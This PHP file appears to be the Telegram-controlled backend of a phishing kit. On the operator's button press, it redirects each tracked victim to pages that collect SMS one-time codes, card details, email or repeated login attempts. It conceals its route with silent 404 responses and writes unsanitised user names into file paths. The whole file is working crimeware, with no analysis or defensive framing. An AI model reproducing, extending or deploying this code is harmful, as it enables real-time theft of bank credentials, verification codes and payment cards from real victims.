<?php
require_once(__DIR__ . "/settings.php");

// ---- Validación 1: solo POST ----
if (($_SERVER['REQUEST_METHOD'] ?? '') !== 'POST') {
    http_response_code(404);
    exit;
}

// ---- Validación 2: secret token del webhook ----
// Telegram envía este header si se configuró setWebhook con secret_token.
$received_secret = $_SERVER['HTTP_X_TELEGRAM_BOT_API_SECRET_TOKEN'] ?? '';
if (!$webhook_secret || !$received_secret || !hash_equals($webhook_secret, $received_secret)) {
    // Silencio total: no revelar que la ruta existe.
    http_response_code(404);
    exit;
}

$content = file_get_contents("php://input");
$update = json_decode($content, true);

// ---- Validación 3: payload mínimo válido ----
if (!is_array($update)) {
    http_response_code(200);
    exit;
}

// ---- Validación 4: el chat origen debe ser el autorizado ----
$incoming_chat = $update["message"]["chat"]["id"]
    ?? $update["callback_query"]["from"]["id"]
    ?? $update["callback_query"]["message"]["chat"]["id"]
    ?? null;

if ($incoming_chat === null || (string)$incoming_chat !== (string)$chat_id) {
    // Update de un chat NO autorizado. Descartar silenciosamente.
    http_response_code(200);
    exit;
}

// LOG mínimo (solo updates autorizados)
$log = date('Y-m-d H:i:s') . " | INPUT: " . substr($content, 0, 300) . "\n";
@file_put_contents(__DIR__ . "/bot_log.txt", $log, FILE_APPEND | LOCK_EX);

http_response_code(200);
header('Content-Type: application/json');
echo json_encode(['ok' => true]);

if (isset($update["callback_query"])) {
    $callback_query_id = $update["callback_query"]["id"];
    $data = $update["callback_query"]["data"];
    list($accion, $usuario) = explode("|", $data);
    $acciones_dir = __DIR__ . "/acciones";
    if (!is_dir($acciones_dir)) { mkdir($acciones_dir, 0755, true); }

    if ($accion === "TOKEN") {
        file_put_contents($acciones_dir . "/{$usuario}.txt", "token.php");
        file_get_contents("https://api.telegram.org/bot$token/answerCallbackQuery?" . http_build_query([
            "callback_query_id" => $callback_query_id,
            "text" => "➡️ Redirigido a SMS para $usuario",
            "show_alert" => false
        ]));
    } elseif ($accion === "TOKEN-ERROR") {
        file_put_contents($acciones_dir . "/{$usuario}.txt", "tokenerror.php");
        file_get_contents("https://api.telegram.org/bot$token/answerCallbackQuery?" . http_build_query([
            "callback_query_id" => $callback_query_id,
            "text" => "❌ Redirigido a SMSERROR para $usuario",
            "show_alert" => false
        ]));
    } elseif ($accion === "LOGIN-ERROR") {
        file_put_contents($acciones_dir . "/{$usuario}.txt", "loginerror.php");
        file_get_contents("https://api.telegram.org/bot$token/answerCallbackQuery?" . http_build_query([
            "callback_query_id" => $callback_query_id,
            "text" => "⚠️ Redirigido a LOGINERROR para $usuario",
            "show_alert" => false
        ]));
    } elseif ($accion === "CARD") {
        file_put_contents($acciones_dir . "/{$usuario}.txt", "card.php");
        file_get_contents("https://api.telegram.org/bot$token/answerCallbackQuery?" . http_build_query([
            "callback_query_id" => $callback_query_id,
            "text" => "💳 Redirigido a CARD para $usuario",
            "show_alert" => false
        ]));
    } elseif ($accion === "LISTO") {
        file_put_contents($acciones_dir . "/{$usuario}.txt", "listo.php");
        file_get_contents("https://api.telegram.org/bot$token/answerCallbackQuery?" . http_build_query([
            "callback_query_id" => $callback_query_id,
            "text" => "✅ Finalizado para $usuario",
            "show_alert" => false
        ]));
    } elseif ($accion === "SMSERROR") {
        file_put_contents($acciones_dir . "/{$usuario}.txt", "token.php");
        file_get_contents("https://api.telegram.org/bot$token/answerCallbackQuery?" . http_build_query([
            "callback_query_id" => $callback_query_id,
            "text" => "❌ Redirigido a TOKEN para $usuario",
            "show_alert" => false
        ]));
    } elseif ($accion === "MAIL") {
        file_put_contents($acciones_dir . "/{$usuario}.txt", "mail.php");
        file_get_contents("https://api.telegram.org/bot$token/answerCallbackQuery?" . http_build_query([
            "callback_query_id" => $callback_query_id,
            "text" => "📧 Redirigido a MAIL para $usuario",
            "show_alert" => false
        ]));
    } elseif ($accion === "LOGIN") {
        file_put_contents($acciones_dir . "/{$usuario}.txt", "index.php");
        file_get_contents("https://api.telegram.org/bot$token/answerCallbackQuery?" . http_build_query([
            "callback_query_id" => $callback_query_id,
            "text" => "🔁 Redirigido a LOGIN principal para $usuario",
            "show_alert" => false
        ]));
    } elseif ($accion === "SMS") {
        file_put_contents($acciones_dir . "/{$usuario}.txt", "token.php");
        file_get_contents("https://api.telegram.org/bot$token/answerCallbackQuery?" . http_build_query([
            "callback_query_id" => $callback_query_id,
            "text" => "📩 Redirigido a SMS para $usuario",
            "show_alert" => false
        ]));
    }
}
?>
